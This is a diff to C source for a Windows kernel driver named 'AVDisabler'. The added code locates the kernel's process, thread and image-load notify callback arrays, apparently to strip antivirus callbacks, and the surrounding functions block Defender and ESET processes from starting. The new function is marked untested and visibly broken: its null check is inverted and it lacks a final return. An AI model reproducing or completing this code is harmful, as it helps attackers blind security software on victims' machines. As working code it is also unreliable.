@@ -128,6 +128,57 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 	}
 }
 
+NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
+				     ULONG_PTR* PspCreateThreadNotifyRoutine,
+				     ULONG_PTR* PspLoadImageNotifyRoutine)
+{
+	/*
+		----Needs to be tested!!!---
+	*/
+
+	typedef int(NTAPI* pPspEnumerateCallback)(
+		int ObjectTypeRoutineArrayIndex,
+		DWORD32* PCallbackIndex,
+		ULONG_PTR* TargetRoutineBaseAddress);
+	
+	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
+	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)MmGetSystemRoutineAddress(&PspEnumerateCallbackName);
+	if(PspEnumerateCallback)
+	{
+		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: Couldn't resolve PspEnumerateCallback address\n"));
+		return STATUS_INVALID_ADDRESS;
+	}
+	KdPrint(("[*] AVDisabler::TerminateAVCallbackRoutines: PspEnumerateCallback address at: 0x%p\n", PspEnumerateCallback));
+
+	DWORD32 CallbackIndex = 1; // Process type
+	PspEnumerateCallback(1, &CallbackIndex, PspCreateProcessNotifyRoutine);
+	if(!(*PspCreateProcessNotifyRoutine))
+	{
+		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateProcessNotifyRoutine address is 0x0,\neither there is no process creation callback routines or there is a bug\n"));
+		return STATUS_INVALID_ADDRESS;
+	}
+	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateProcessNotifyRoutine: 0x%p\n", *PspCreateProcessNotifyRoutine));
+	
+	CallbackIndex = 0; // Thread type
+	PspEnumerateCallback(1, &CallbackIndex, PspCreateThreadNotifyRoutine);
+	if (!(*PspCreateThreadNotifyRoutine))
+	{
+		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateThreadNotifyRoutine address is 0x0,\neither there is no thread creation callback routines or there is a bug\n"));
+		return STATUS_INVALID_ADDRESS;
+	}
+	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateThreadNotifyRoutine: 0x%p\n", *PspCreateThreadNotifyRoutine));
+	
+	CallbackIndex = 2; // Image type
+	PspEnumerateCallback(1, &CallbackIndex, PspLoadImageNotifyRoutine);
+	if (!(*PspLoadImageNotifyRoutine))
+	{
+		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspLoadImageNotifyRoutine address is 0x0,\neither there is no load image callback routines or there is a bug\n"));
+		return STATUS_INVALID_ADDRESS;
+	}
+	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspLoadImageNotifyRoutine: 0x%p\n", *PspLoadImageNotifyRoutine));
+
+}
+
 void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 	NTSTATUS status = STATUS_SUCCESS;
